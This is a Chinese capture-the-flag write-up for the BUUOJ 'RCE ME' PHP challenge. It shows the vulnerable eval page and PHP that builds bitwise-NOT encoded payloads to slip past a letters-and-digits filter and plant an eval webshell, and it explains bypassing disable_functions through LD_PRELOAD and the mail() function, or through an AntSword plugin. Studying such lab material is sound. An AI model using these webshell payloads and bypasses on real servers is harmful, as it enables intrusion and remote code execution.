# [极客大挑战 2019]RCE ME

[题目地址](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]RCE%20ME)

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

一个[无数字字母getshell](https://www.freebuf.com/articles/network/279563.html)题。这种单纯过滤字母数字却没过滤符号的一般有两种思路：异或和取反。需要先确认php的版本，如果是php7以上会比php5方便，因为php7支持`($a)();`这种形式调用。通过服务器返回的包的`X-Powered-By: PHP/7.0.33`，得知是php7。这就简单了，直接构造payload。

```php
<?php 
$a='assert';
$b=urlencode(~$a);
echo '(~'.$b.')';  //~是取反符
$c='(eval($_POST[a]))';
$d=urlencode(~$c);
echo '(~'.$d.');';
//(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);
```

然后把下面的url拿去连蚁剑，密码是a。

- http://85f9073d-fe32-42d1-81c9-1f85e8a151c8.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);

flag怎么看不了？看下phpinfo。

```php
<?php 
$a='phpinfo';
$b=urlencode(~$a);
echo '(~'.$b.')';
echo '();';
//(~%8F%97%8F%96%91%99%90)();
```

- http://85f9073d-fe32-42d1-81c9-1f85e8a151c8.node4.buuoj.cn:81/?code=(~%8F%97%8F%96%91%99%90)();

查找disable_functions，禁了一堆函数。需要绕过被禁用函数，有两种方法。第一种，跟着[wp](https://blog.csdn.net/mochu7777777/article/details/105136633)利用[LD_PRELOAD突破disable_functions](https://www.freebuf.com/web/192052.html)。文章讲得很好，我简述一下原理。当web程序调用系统函数时，如果系统函数在系统共享对象xxx.so中，系统就需要去加载那个so。如果我们可以自己上传一个evil.so，让evil.so里面有web程序想要加载的同名函数且evil.so的加载优先级更高，就能执行任意函数。

那么如何让程序优先加载我们上传的evil.so呢？这就要利用到linux的一个共享库环境变量——[LD_PRELOAD](https://blog.csdn.net/htf15/article/details/8689973)了。现在我们有了劫持系统函数的方法，然而有个问题：想用这个方法劫持系统函数，需要有能力控制 php 启动外部程序才行（只要有进程启动行为即可）。解决办法是php的mail函数，该函数内部会启动/usr/sbin/sendmail、/usr/sbin/postdrop 两个新进程。

一波刚平，一波又起。经常被用于劫持的函数是sendmail，因为这个函数里会调用getuid()，getuid()没啥参数，比较容易劫持。问题又来了，万一要攻击的web服务压根就没开sendmail呢？看来不得不放弃劫持函数 getuid()，找个更普遍的方法。如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 或是任何其他函数了。这个方法就是GCC的C 语言扩展修饰符 `__attribute__((constructor))`，可以让由它修饰的函数在 main() 之前执行。若它出现在共享对象中时，那么一旦共享对象被系统加载，立即执行 `__attribute__((constructor))` 修饰的函数。

于是我们可以这么干。拿到有禁用函数的webshell后，找到一个有上传权限的目录，上传一个php文件用于获取shell命令，更改LD_PRELOAD以及调用mail函数。再上传一个so文件，里面用`__attribute__((constructor))` 修饰函数，被修饰的函数执行系统命令。这些文件都可以在[此处](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)找到。

或者无脑脚本小子做法。直接打开蚁剑的插件市场，找到“绕过disable_funtions“，在刚刚连接上的shell右键->加载插件->辅助工具->绕过disable_functions。模式选择`PHP7_GC_UAF`再点击开始，就能执行命令了。执行根目录下的readflag，就能获取到flag了。